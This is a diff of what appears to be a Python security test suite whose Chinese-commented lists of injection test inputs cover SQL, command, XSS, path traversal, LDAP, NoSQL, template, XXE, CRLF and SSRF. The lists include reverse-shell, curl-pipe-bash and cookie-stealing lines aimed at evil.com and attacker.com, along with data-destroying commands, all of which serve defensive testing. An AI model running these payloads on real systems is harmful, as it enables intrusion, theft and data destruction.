@@ -35,31 +35,24 @@ class TestSQLInjectionAttacks:
             "' OR 1=1 --",
             "admin' --",
             "' UNION SELECT * FROM users --",
-
             # 基于时间的注入
             "'; WAITFOR DELAY '00:00:10' --",
             "' OR SLEEP(10) --",
-
             # 堆叠查询
             "'; DROP TABLE users; SELECT * FROM data WHERE '1'='1' --",
-
             # 二次注入
             "' OR (SELECT COUNT(*) FROM users) > 0 --",
-
             # 编码注入
             "%27%20OR%201=1%20--",
             "' OR 1=1#",
             "' OR 1=1/*",
-
             # 条件注入
             "' IF (1=1) DROP TABLE users --",
             "' AND 1=1; DROP TABLE users --",
-
             # 使用注释符
             "#",
             "--",
             "/*",
-
             # 带有子查询的注入
             "' OR (SELECT password FROM users WHERE username='admin') --",
         ],
@@ -129,32 +122,25 @@ class TestCommandInjectionAttacks:
             "; rm -rf /",
             "| nc attacker.com 4444 -e /bin/bash",
             "; curl http://evil.com/shell.sh | bash",
-
             # Windows 命令注入
             "& dir",
             "| type C:\\Windows\\win.ini",
             "`net user`",
-
             # 连续命令
             "; ls; pwd; whoami",
             "| cat /etc/passwd | nc attacker.com 1234",
-
             # 后台执行
             "; nohup bash -c 'curl http://evil.com' &",
-
             # 管道和重定向
             "; cat /etc/passwd > /tmp/stolen.txt",
             "| mysql -u root -p'password' -e 'SHOW DATABASES'",
-
             # 使用换行符
             "\nls\n",
             "\r\nrm -rf /\r\n",
-
             # 使用分号和其他分隔符
             "&& evil_command",
             "|| evil_command",
             "; evil_command",
-
             # 命令替换的各种形式
             "$(evil_command)",
             "`evil_command`",
@@ -218,53 +204,40 @@ class TestXSSAttacks:
             "<script>alert('XSS')</script>",
             "<SCRIPT>alert('XSS')</SCRIPT>",
             "<ScRiPt>alert('XSS')</ScRiPt>",
-
             # 事件处理器
             "<img onerror=\"alert('XSS')\" src=x>",
             "<body onload=\"alert('XSS')\">",
             "<svg onload=\"alert('XSS')\">",
             "<div onmouseover=\"alert('XSS')\">hover me</div>",
-
             # javascript: 协议
             "<a href=\"javascript:alert('XSS')\">click</a>",
             "<img src=\"javascript:alert('XSS')\">",
-
             # 编码变体
             "<script>alert(String.fromCharCode(88,83,83))</script>",
             "<script>alert(&quot;XSS&quot;)</script>",
             "<script>alert('XSS')</script>",
-
             # HTML 实体编码
             "<script>alert('XSS')</script>",
             "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
-
             # CSS 注入
             "<style>alert('XSS')</style>",
             "<div style=\"background:url('javascript:alert(1)')\">",
-
             # iframe 注入
             "<iframe src=\"javascript:alert('XSS')\">",
-            "<iframe src=\"http://evil.com\">",
-
+            '<iframe src="http://evil.com">',
             # 表单劫持
             "<form><input onfocus=\"alert('XSS')\" autofocus>",
-
             # DOM XSS
             "<img src=x onerror=\"document.location='http://evil.com?'+document.cookie\">",
-
             # 结合注释
             "<!--<script>alert('XSS')</script>-->",
-
             # Meta 标签
-            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
-
+            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
             # 利用特殊字符
             "<script>alert(`XSS`)</script>",
             "<script>alert('XSS')</script>",
-
             # SVG 中的 script
             "<svg><script>alert('XSS')</script></svg>",
-
             # data URI
             "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
         ],
@@ -327,34 +300,26 @@ class TestPathTraversalAttacks:
             "..\\..\\..\\windows\\win.ini",
             "....//....//....//etc/passwd",
             "../etc/passwd",
-
             # URL 编码
             "%2e%2e%2fetc%2fpasswd",
             "%252e%252e%252fetc%252fpasswd",
-
             # 双重编码
             "%252e%252e%252f",
-
             # UTF-8 编码
             "..%c0%afetc/passwd",
             "..%c0%af..%c0%af..%c0%afetc/passwd",
-
             # 绝对路径
             "/etc/passwd",
             "/etc/shadow",
             "C:\\Windows\\System32\\config\\SAM",
-
             # 空字节注入（某些旧版本）
             "../../../etc/passwd\x00.jpg",
-
             # 结合其他路径
             "normal/../../../etc/passwd",
             "normal\\..\\..\\windows\\win.ini",
-
             # 使用点号变体
             "..././..././etc/passwd",
             "....//....//etc/passwd",
-
             # 结合合法路径
             "uploads/../../etc/passwd",
             "static/../../../etc/passwd",
@@ -393,20 +358,16 @@ class TestLDAPInjectionAttacks:
             "*)(&(uid=*",
             "*(|(mail=*",
             "admin))(|(password=*",
-
             # LDAP 盲注
             "*)(uid=*))%00",
             "*)(&(objectClass=*))%00",
-
             # 认证绕过
             "*)(uid=*))(|(password=*",
             "admin)(&(password=*))",
-
             # 使用通配符
             "*",
             "**",
             "a*",
-
             # 结合逻辑运算
             "*(|(cn=*)(cn=*))",
             "*)(|(password=*)(cn=*))",
@@ -445,16 +406,13 @@ class TestNoSQLInjectionAttacks:
             '{"$gt": ""}',
             '{"$regex": ".*"}',
             '{"$where": "sleep(5000)"}',
-
             # 操作符注入
             "'; return db.users.find(); //",
             "'; return db.users.drop(); //",
             "1; return db.users.find(); //",
-
             # 结合逻辑
             '{"$or": [{"admin": true}, {"admin": {"$exists": true}}]}',
             '{"$in": ["admin", "root"]}',
-
             # NoSQL 盲注
             '{"$ne": null}',
             '{"$gt": undefined}',
@@ -492,13 +450,10 @@ class TestTemplateInjectionAttacks:
             "{{config}}",
             "{{''.__class__.__mro__[2].__subclasses__()}}",
             "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['eval']('__import__(\"os\").popen(\"id\").read()')}}{% endif %}{% endfor %}",
-
             # Mako 模板注入
             "<%import os%>${os.popen('id').read()}",
-
             # ERB 模板注入（Ruby）
             "<%= system('id') %>",
-
             # Twig 模板注入
             "{{_self.env.display('id')}}",
             "{{_self.env.cache.clear('id')}}",
@@ -533,16 +488,12 @@ class TestXXEAttacks:
         [
             # 基础 XXE
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-
             # 参数实体
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo></foo>',
-
             # 外部 DTD
             '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd"><foo>&xxe;</foo>',
-
             # 盲注
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/?data=%data;"]><foo>&xxe;</foo>',
-
             # SSRF
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service/">]><foo>&xxe;</foo>',
         ],
@@ -579,14 +530,11 @@ class TestCRLFInjectionAttacks:
             "test\r\nSet-Cookie: malicious=true",
             "test\nX-Forwarded-For: 127.0.0.1",
             "test\r\nLocation: http://evil.com",
-
             # 日志注入
             "test\n[ERROR] Fake error message",
             "test\r\n[INFO] Fake info message",
-
             # CRLF 组合
             "test\r\n\r\nEvil content",
-
             # 结合其他攻击
             "test\r\n<script>alert('XSS')</script>",
             "test\n'; DROP TABLE users; --",
@@ -623,24 +571,19 @@ class TestSSRFAttacks:
             "http://localhost:8080/admin",
             "http://127.0.0.1:22",
             "http://0.0.0.0:8080",
-
             # 内网 IP
             "http://192.168.1.1/admin",
             "http://10.0.0.1/secret",
             "http://172.16.0.1/internal",
-
             # 云元数据服务
             "http://169.254.169.254/latest/meta-data/",
             "http://metadata.google.internal/computeMetadata/v1/",
-
             # DNS 重绑定
             "http://evil.com@127.0.0.1",
             "http://127.0.0.1.evil.com",
-
             # IPv6
             "http://[::1]/admin",
             "http://[::ffff:127.0.0.1]/admin",
-
             # 其他协议
             "file:///etc/passwd",
             "ftp://internal.server/secret",
